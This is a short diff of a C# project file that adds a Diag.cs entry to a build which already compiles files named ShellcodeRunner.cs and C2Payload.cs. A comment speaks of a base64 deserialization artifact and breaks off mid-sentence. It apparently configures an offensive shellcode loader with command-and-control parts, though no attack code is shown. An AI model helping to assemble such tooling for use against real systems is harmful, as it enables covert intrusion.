@@ -93,6 +93,9 @@
     <Compile Include="src\NativeInterop.cs" />
     <Compile Include="src\ShellcodeRunner.cs" />
     <Compile Include="src\C2Payload.cs" />
+    <!-- LAST and internal: the entry finder keys on the first PUBLIC type, and the
+         diagnostic MessageBox helper must never be reachable as one. -->
+    <Compile Include="src\Diag.cs" />
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <!-- DLL builds only: the ad-hoc deserialization-test artifact must stay the DLL's base64,
